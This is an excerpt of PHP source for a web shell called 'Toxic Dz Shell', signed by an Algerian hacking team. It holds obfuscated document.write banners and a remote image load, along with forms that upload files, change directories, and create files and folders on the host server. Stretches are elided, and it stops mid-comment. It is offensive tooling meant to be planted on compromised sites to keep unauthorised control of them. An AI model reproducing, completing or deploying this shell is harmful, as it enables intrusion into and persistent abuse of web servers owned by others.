...
//The header, like it?
$header = '<html>
<title>'.getenv("HTTP_HOST").' ~~ Toxic Dz Shell</title>
<head>
<script>
document.write(unescape("%3Cdiv%20align%3D%22Left%22%20class%3D%22style1%22%3E%0A%20%20%3Cp%3E%3Cimg%20src%3D%22http%3A//im54.gulfup.com/iByLJ.jpg%22%20width%3D%22220%22%20height%3D%22180%22%20/%3E%3C/p%3E"));
</script>
<script>
document.write(unescape("%3Cp%20align%3D%22%22%3E%3Cb%3E%3Cfont%20color%3D%22%23ff0000%22%20face%3D%22Comic%20Sans%20MS%22%20size%3D%225%22%3EToxic%20Dz%3C/font%3E%3Cspan%20lang%3D%22en-us%22%3E%3Cfont%20color%3D%22%23ffffff%22%20face%3D%22Comic%20Sans%20MS%22%20size%3D%225%22%3E%20%0Ashell%20v%201.0%20%3C/font%3E%3C/span%3E%3C/b%3E%3C/p%3E%3C/p%3E%3Cbr%3E"));
</script>
...
</head><p align="center"><b><span lang="en-us"><font color="#ffffff" face="Comic Sans MS" size="4"> 
_________________________________ _ _ _ ___________________________________ </font></span></b></p>
<body bgcolor=#000000 alink="#FFFFFF" vlink="#00FF00" link="#00FF00">
<table width=100%><td id="header" width=100%>
<p align=Center><b> [<a href="'.$me.'">Home</a>] ';
...
print $header;
$footer = '<tr><td><hr><center>&copy; <a ><script>
document.write(unescape("Toxic%20Dz%20-%20Team%20Dz%20%3Cbr%3E%20Algerian%20Hackers%20%20"));
</script></a></center></td></table></body></head></html>';
...
<input type=\"hidden\" name=\"MAX_FILE_SIZE\" value=\"100000000\" /><input size=50 name=\"uploadedfile\" type=\"file\" />
<input type=\"submit\" value=\"Upload File\" />
</form></td><td><form action=\"".$me."\" method=GET><b>Change Directory<br></b><input type=text size=50 name=dir value=\"".realpath('.')."\"><input type=submit value=\"Change Directory\"></form></td>
<tr><td><form action=\"".$me."\" method=GET><b>Create file<br></b><input type=hidden name=dir value=\"".realpath('.')."\"><input type=text size=50 name=file value=\"".realpath('.')."\"><input type=hidden name=p value=edit><input type=submit value=\"Create file\"></form>
</td><td><form action=\"".$me."\" method=GET><b>Create directory<br></b><input type=text size=50 name=crdir value=\"".realpath('.')."\"><input type=hidden name=dir value=\"".realpath('.')."\"><input type=hidden name=p value=createdir><input type=submit value=\"Create directory\"></form></td>
</table>";
...
{
if(is_writable($file)) { return "#00FF00";} 
if(!is_writable($file) && is_readable($file)) { return "#00FF00";}
if(!is_writable($file) && !is_readable($file)) { return "#00FF00";}
...
print $footer;
// Exit: maybe we're included somewhere and we don't want the